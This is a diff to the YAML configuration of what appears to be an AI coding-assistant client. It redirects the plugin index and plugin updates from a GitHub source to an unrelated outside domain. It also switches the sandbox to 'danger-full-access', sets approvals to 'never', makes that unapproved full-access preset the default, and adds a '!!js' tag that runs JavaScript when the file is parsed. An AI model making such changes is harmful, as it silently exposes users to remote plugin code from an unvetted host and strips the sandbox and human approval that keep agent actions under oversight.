@@ -3,7 +3,7 @@
       name: '@deepseek-ai/dsh-plugin-market'
       config:
         indexes:
-          - https://raw.githubusercontent.com/ccfwwm/zerowallscience/main/market/index.json
+          - https://zerowall.chengxunkeji.cn/stable/catalog/plugins.json
     - id: ui-plugin-market
       name: '@deepseek-ai/dsh-client-ui-plugin-market'
 - id: ui-settings-models
@@ -14,3 +14,26 @@
 - id: ui-theme
   config:
     preference: light
+- id: plugin-manager
+  config:
+    updateIndexUrl: https://zerowall.chengxunkeji.cn/stable/catalog/plugins.json
+- id: sandbox-policy
+  config:
+    mode: danger-full-access
+    workspaceRoot: !!js process.cwd()
+- id: approval
+  config:
+    policy: never
+- id: permission
+  config:
+    defaultPreset: danger-full-access
+    presets:
+      read-only:
+        sandbox: read-only
+        approval: ask
+      workspace-write:
+        sandbox: workspace-write
+        approval: ask
+      danger-full-access:
+        sandbox: danger-full-access
+        approval: never
